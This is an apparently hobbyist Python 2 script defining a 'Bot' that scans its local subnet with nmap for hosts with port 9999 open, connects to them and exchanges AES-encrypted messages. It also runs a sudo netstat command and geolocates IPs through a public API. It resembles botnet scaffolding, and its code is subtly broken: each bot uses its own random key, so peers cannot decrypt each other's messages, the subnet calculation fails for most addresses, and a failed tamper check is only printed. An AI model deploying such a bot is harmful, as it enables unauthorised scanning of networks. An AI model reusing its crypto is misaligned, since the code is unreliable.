from Crypto.Cipher import AES
from Crypto import Random
import nmap
import subprocess
import base64
import hashlib
import hmac
import socket
import urllib

class Bot:

	BLOCK_SIZE = 16
	PADDING = '\0'
	
	SERVER = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	port = 9999
	connected_hosts = []

	def __init__(self):
		self.key = Random.new().read(self.BLOCK_SIZE)
		self.scan_network()

	def connect(self, serv, portNum):
		try:
			self.SERVER.connect((serv, portNum))
			self.connected_hosts.append(serv)
		except:
			print("[-] Could Not Connect")	
		


	def send_message(self, message):
		self.SERVER.sendall(self.encryptAES(message))


	def receive_message(self, message):
		return self.decryptAES(message)


	def encryptAES(self, message):
		iv = Random.new().read(self.BLOCK_SIZE)
		cipher = AES.new(self.key, AES.MODE_CBC, iv)
		ciphertext = base64.b64encode(iv + cipher.encrypt(self.pad(message)))
		digest = self.get_hmac(ciphertext)
		return str(digest) + str(ciphertext)


	def decryptAES(self, ciphertext):
		digest = ciphertext[:16]
		ciphertext = ciphertext[16:]
		if str(digest) != str(self.get_hmac(ciphertext)):
			print("[-] MESSAGE TAMPERED")
		iv = base64.b64decode(ciphertext)[:16]
		cipher = AES.new(self.key, AES.MODE_CBC, iv)
		return cipher.decrypt(base64.b64decode(ciphertext)[16:])\
		.rstrip(self.PADDING)
					

	def get_hmac(self, message):
		key = hashlib.sha1(self.key).digest()
		digest = hmac.new(key, message, hashlib.sha512).digest()
		return base64.b64encode(digest)[:16]


	def pad(self, message):
		return message + (self.BLOCK_SIZE - len(message) % self.BLOCK_SIZE) * \
		self.PADDING


	def get_ip_location(self, ip):
		return urllib.urlopen('http://api.hostip.info/get_html.php?ip='+ip+\
			'&position=true').read()


	def get_active_connections(self):
		cmd = "sudo netstat -alpn | grep :80 | awk '{print $5}' |awk -F: "\
		"'{print $(NF-1)}' |sort | uniq -c | sort -n"
		ps =  subprocess.Popen(cmd, stdout=subprocess.PIPE, \
			stderr=subprocess.STDOUT, shell=True)
		return ps.communicate()[0]
	
	def get_local_ip(self):
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		s.connect(("gmail.com",80))
		ip = s.getsockname()[0]
		s.close()
		return ip
	
	def scan_network(self):
		nm = nmap.PortScanner()
		ip_range = self.get_local_ip()[:-2]
		
		subnet = ip_range + '.0-255'
		print subnet
		nm.scan(subnet, str(self.port))
		for host in nm.all_hosts():
			if host not in self.connected_hosts:
				state = nm[host]['tcp'][self.port]['state']
				if state == 'open':
					self.connect(host, self.port)
				else:
					print("%s Closed" % host)

bot = Bot()